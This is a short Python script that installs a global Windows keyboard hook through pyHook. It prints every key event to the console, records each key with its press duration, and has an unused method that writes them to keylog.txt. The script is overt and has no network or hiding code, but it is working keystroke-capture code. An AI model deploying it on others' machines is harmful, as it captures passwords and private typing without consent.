
import pythoncom, pyHook

class KeyLogger:

    def __init__(self):
        self.saveKey = []
        self.tmp_time = -1

    def OnKeyDownEvent(self, event):
        #global tmp_time
        if self.tmp_time == -1:
            self.tmp_time = event.Time
        
        # return True to pass the event to other handlers
        return True

    def OnKeyUpEvent(self, event):
        #global tmp_time
        print ('MessageName:',event.MessageName)
        print ('Message:',event.Message)
        print ('Time:',event.Time)
        print ('Window:',event.Window)
        print ('WindowName:',event.WindowName)
        print ('Ascii:', event.Ascii, chr(event.Ascii))
        print ('Key:', event.Key)
        print ('KeyID:', event.KeyID)
        print ('ScanCode:', event.ScanCode)
        print ('Extended:', event.Extended)
        print ('Injected:', event.Injected)
        print ('Alt', event.Alt)
        print ('Transition', event.Transition)
        print ('-----------------------')

        self.saveKey.append(event.Key)
        self.saveKey.append(' ')
        self.saveKey.append(float(event.Time - self.tmp_time)/1000)
        self.saveKey.append('\n')
        self.tmp_time = -1

        # return True to pass the event to other handlers
        return True

    def saveKeyLog(self):
        f = open("keylog.txt",'wt', encoding='UTF-8')
        test="".join(str(s) for s in self.saveKey)
        f.write(test)
        f.close()

if __name__ == '__main__':

    keylogger = KeyLogger()
    # create a hook manager
    hm = pyHook.HookManager()
    # watch for all keyboard events
    hm.KeyDown = keylogger.OnKeyDownEvent
    hm.KeyUp = keylogger.OnKeyUpEvent
    # set the hook
    hm.HookKeyboard()
    # wait forever
    pythoncom.PumpMessages()